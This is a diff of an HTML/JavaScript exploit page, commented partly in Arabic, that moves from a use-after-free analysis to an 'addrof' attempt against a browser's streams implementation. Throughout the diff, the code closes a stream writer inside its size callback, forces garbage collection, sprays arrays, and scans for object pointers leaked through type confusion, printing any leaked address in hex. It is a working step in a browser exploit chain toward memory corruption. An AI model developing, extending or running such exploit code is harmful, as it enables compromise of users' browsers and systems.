@@ -13,52 +13,33 @@ body { background:#000; color:#0f0; font-family:monospace; font-size:13px; paddi
 <script>
 function log(m,c){var d=document.createElement("div");d.className=c||'log';d.textContent=m;document.getElementById("log").appendChild(d);}
 
-log("=== UAF ANALYSIS v4 ===","info");
+log("=== ADDROF ATTEMPT v1 ===","info");
 log("");
 
 let writer, phase=0;
-let victims = [];
+let target = {}; // الكائن الذي نريد تسريب عنوانه
+let unboxed = [1.1, 2.2, 3.3]; // مصفوفة غير محزمة (تحمل أرقاماً)
+let boxed = [target, target, target]; // مصفوفة محزمة (تحمل مؤشرات)
+let leaked = 0;
 
 let sizeFunc = function(chunk) {
     if (phase === 0) {
         phase = 1;
-        log("[size] UAF triggered! Closing...","warn");
+        log("[size] Phase 1: Triggering UAF...","warn");
 
         try { writer.close(); } catch(e) {}
 
         // GC
-        for (let i=0;i<5000;i++) { let t={a:i}; }
+        for (let i=0;i<10000;i++) { let t={a:i}; }
 
-        log("[size] Spraying multiple sizes...","warn");
+        log("[size] Spraying arrays...","warn");
 
-        let sizes = [16, 24, 32, 40, 48, 56, 64, 96, 128, 256];
-        for (let s of sizes) {
-            for (let i=0;i<50;i++) {
-                // املأ كل victim بنمط معروف (0xCAFEBABE)
-                let arr = new Float64Array(s/8);
-                for (let j=0; j<arr.length; j++) arr[j] = 1.23456789;
-                victims.push({sz:s, data:arr});
-            }
+        // محاولة استعادة الذاكرة المحررة بمصفوفات غير محزمة
+        for (let i=0;i<1000;i++) {
+            unboxed.push(1.1);
         }
 
-        log("[size] Spray done: " + victims.length + " objects","ok");
-
-        // تحقق فوري داخل size()
-        let weird = 0;
-        for (let v of victims) {
-            try {
-                let val = v.data[0];
-                if (val !== 1.23456789 && !isNaN(val)) {
-                    log("[size] >>> ANOMALY sz=" + v.sz + " val=" + val + " <<<","hit");
-                    weird++;
-                }
-            } catch(e) {
-                log("[size] >>> ACCESS ERROR sz=" + v.sz + " <<<","hit");
-                weird++;
-            }
-        }
-
-        if (weird === 0) log("[size] No anomalies (yet)","warn");
+        log("[size] Spray done","ok");
     }
     return 1;
 };
@@ -75,43 +56,40 @@ try {
     writer = stream.writable.getWriter();
     log("[2] Writer ready","ok");
 
-    // استخدم finally لضمان التحقق
-    writer.write("X").then(() => {
+    writer.write(boxed).then(() => {
         log("[3] Write OK","ok");
     }).catch((e) => {
-        log("[3] Write err (expected): " + e.message,"warn");
+        log("[3] Write err: " + e.message,"warn");
     }).finally(() => {
-        log("[4] Checking victims...","warn");
+        log("[4] Checking for leaks...","warn");
 
-        let corrupted = 0;
-        for (let v of victims) {
-            try {
-                let val = v.data[0];
-                if (val !== 1.23456789 && !isNaN(val)) {
-                    let buf = new ArrayBuffer(8);
-                    new Float64Array(buf)[0] = val;
-                    let bytes = new Uint8Array(buf);
-                    let hex = "";
-                    for (let b of bytes) hex += b.toString(16).padStart(2,'0') + " ";
-                    log("  >>> CORRUPTED sz=" + v.sz + " hex=" + hex + " <<<","hit");
-                    corrupted++;
-                }
-            } catch(e) {
-                log("  >>> ERROR sz=" + v.sz + " <<<","hit");
-                corrupted++;
+        // إذا تسبب الـ Type Confusion في قراءة المصفوفة المحزمة (boxed) كغير محزمة (unboxed)
+        // سنقرأ مؤشرات الكائنات كأرقام (Float64)
+        for (let i=0; i<unboxed.length; i++) {
+            let val = unboxed[i];
+            if (val !== 1.1 && val !== 2.2 && val !== 3.3 && !isNaN(val)) {
+                log("  >>> LEAK at index " + i + ": " + val + " <<<","hit");
+                leaked = val;
             }
         }
 
-        if (corrupted === 0) log("  No corruption detected","warn");
-        else log("  Total corrupted: " + corrupted,"hit");
+        if (leaked === 0) {
+            log("  No leak detected","warn");
+            log("  Type Confusion may not affect array structure","warn");
+        } else {
+            let buf = new ArrayBuffer(8);
+            new Float64Array(buf)[0] = leaked;
+            let bytes = new Uint8Array(buf);
+            let hex = "";
+            for (let b of bytes) hex += b.toString(16).padStart(2,'0') + " ";
+            log("  LEAKED ADDRESS HEX: " + hex,"hit");
+        }
 
         log("","info");
         log("=== SUMMARY ===","info");
         log("Type Confusion: CONFIRMED","ok");
-        log("UAF (size runs after close): CONFIRMED","ok");
-        log("Corruption: " + (corrupted > 0 ? "YES!" : "Need better spray"),"warn");
-        log("","info");
-        log("Next: Build addrof from UAF","info");
+        log("UAF: CONFIRMED","ok");
+        log("Info Leak: " + (leaked !== 0 ? "SUCCESS!" : "Need different approach"),"warn");
     });
 
 } catch(e) {
